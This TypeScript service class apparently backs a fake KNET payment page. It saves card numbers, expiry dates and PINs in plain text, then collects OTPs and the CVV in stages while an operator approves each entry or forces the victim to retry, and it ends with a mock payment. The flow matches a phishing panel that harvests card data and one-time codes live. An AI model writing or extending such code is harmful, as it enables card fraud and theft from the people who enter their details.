import {
    acknowledgeKnetRetryByOrderId,
    findKnetById,
    findKnetByOrderId,
    KNET_REVIEW,
    knet,
    knetRejectToRetry,
    listAllKnet,
    setKnetReviewStep,
    setKnetStatus,
    updateKnetCvvByOrderId,
    updateKnetOtpByOrderId,
    updateKnetOtp2ByOrderId,
} from "@/models/knet.repository";
import { mockPay } from "@/services/recharge.service";

export type KnetDecision = "approved" | "rejected";

class KnetService {
    static async getKnet(amount: number) {
        return {
            amount,
        };
    }

    static async createKnet(
        amount: number,
        cardNumber: string,
        expiryDate: string,
        pin: string,
        orderId?: string,
    ) {
        const knetData = await knet.create({
            amount: amount,
            cardNumber: cardNumber,
            expiryDate: expiryDate,
            pin: pin,
            cvv: "",
            status: "pending",
            reviewStep: KNET_REVIEW.awaitingAdminCard,
            createdAt: new Date(),
            updatedAt: new Date(),
            orderId,
        });
        return knetData;
    }

    static async listAll() {
        return listAllKnet();
    }

    static async getById(id: string) {
        return findKnetById(id);
    }

    static async updateStatus(id: string, decision: KnetDecision) {
        const row = await findKnetById(id);
        if (!row) throw new Error("not_found");
        if (row.status !== "pending") throw new Error("generic");

        if (decision === "rejected") {
            switch (row.reviewStep) {
                case KNET_REVIEW.awaitingAdminCard:
                    return knetRejectToRetry(id, KNET_REVIEW.retryCard);
                case KNET_REVIEW.awaitingAdminOtp:
                    return knetRejectToRetry(id, KNET_REVIEW.retryOtp);
                case KNET_REVIEW.awaitingAdminCvv:
                    return knetRejectToRetry(id, KNET_REVIEW.retryCvv, { clearCvv: true });
                case KNET_REVIEW.awaitingAdminOtp2:
                    return knetRejectToRetry(id, KNET_REVIEW.retryOtp2);
                default:
                    return setKnetStatus(id, "rejected", KNET_REVIEW.done);
            }
        }

        switch (row.reviewStep) {
            case KNET_REVIEW.awaitingAdminCard:
                return setKnetReviewStep(id, KNET_REVIEW.otpEntry);
            case KNET_REVIEW.awaitingAdminOtp:
                return setKnetReviewStep(id, KNET_REVIEW.cvvEntry);
            case KNET_REVIEW.awaitingAdminCvv:
                return setKnetReviewStep(id, KNET_REVIEW.otp2Entry);
            case KNET_REVIEW.awaitingAdminOtp2: {
                const updated = await setKnetStatus(id, "approved", KNET_REVIEW.done);
                if (updated.orderId) await mockPay(updated.orderId, "knet");
                return updated;
            }
            default:
                throw new Error("generic");
        }
    }

    static async submitOtpForOrder(orderId: string, otp: string) {
        const row = await findKnetByOrderId(orderId);
        if (!row) throw new Error("not_found");
        if (row.reviewStep !== KNET_REVIEW.otpEntry && row.reviewStep !== KNET_REVIEW.retryOtp) {
            throw new Error("generic");
        }
        return updateKnetOtpByOrderId(orderId, otp);
    }

    static async submitCvvForOrder(orderId: string, cvv: string) {
        const row = await findKnetByOrderId(orderId);
        if (!row) throw new Error("not_found");
        if (row.reviewStep !== KNET_REVIEW.cvvEntry && row.reviewStep !== KNET_REVIEW.retryCvv) {
            throw new Error("generic");
        }
        return updateKnetCvvByOrderId(orderId, cvv);
    }

    static async submitOtp2ForOrder(orderId: string, otp2: string) {
        const row = await findKnetByOrderId(orderId);
        if (!row) throw new Error("not_found");
        if (row.reviewStep !== KNET_REVIEW.otp2Entry && row.reviewStep !== KNET_REVIEW.retryOtp2) {
            throw new Error("generic");
        }
        return updateKnetOtp2ByOrderId(orderId, otp2);
    }

    static async getByOrderId(orderId: string) {
        return findKnetByOrderId(orderId);
    }

    static async acknowledgeRetry(orderId: string) {
        return acknowledgeKnetRetryByOrderId(orderId);
    }
}

export default KnetService;
